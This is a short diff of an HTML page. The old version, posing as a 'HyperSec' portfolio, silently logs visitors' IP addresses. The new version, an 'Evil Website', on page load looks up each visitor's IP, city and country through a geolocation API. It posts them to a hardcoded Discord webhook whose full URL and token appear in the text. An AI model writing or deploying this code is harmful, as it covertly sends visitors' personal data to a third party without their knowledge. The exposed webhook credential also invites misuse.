@@ -1,23 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>HyperSec</title>
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <title>Evil Website</title>
   <script>
-    $(document).ready(function() {
-      var webhookUrl = "https://discord.com/api/webhooks/1201943878429577257/o1yNW-9fnWcP2SiwxIqjRZn3cW80V-rp6fAAyUw9F891i_QfkmApoY4PGdPm4ugE-kID";
-      
-      $.get("https://api.ipify.org?format=json", function(data) {
-        var ip = data.ip;
-        
-        // Send IP to Discord webhook
-        $.post(webhookUrl, { content: "IP Logged: " + ip });
-      });
-    });
+    function logIP() {
+      fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+          const webhookURL = 'https://discord.com/api/webhooks/1201943878429577257/o1yNW-9fnWcP2SiwxIqjRZn3cW80V-rp6fAAyUw9F891i_QfkmApoY4PGdPm4ugE-kID';
+          const payload = {
+            content: 'IP Logged!',
+            embeds: [{
+              title: 'Logged IP Address',
+              description: `IP: ${data.ip}\nCity: ${data.city}\nCountry: ${data.country_name}`,
+              color: 16711680 // red color for emphasis
+            }]
+          };
+          fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+          });
+        });
+    }
   </script>
 </head>
-<body>
-  <h1>HyperSec</h1>
-  <p>My portfolio</p>
+<body onload="logIP()">
+  <h1>Welcome to the Evil Website!</h1>
 </body>
 </html>
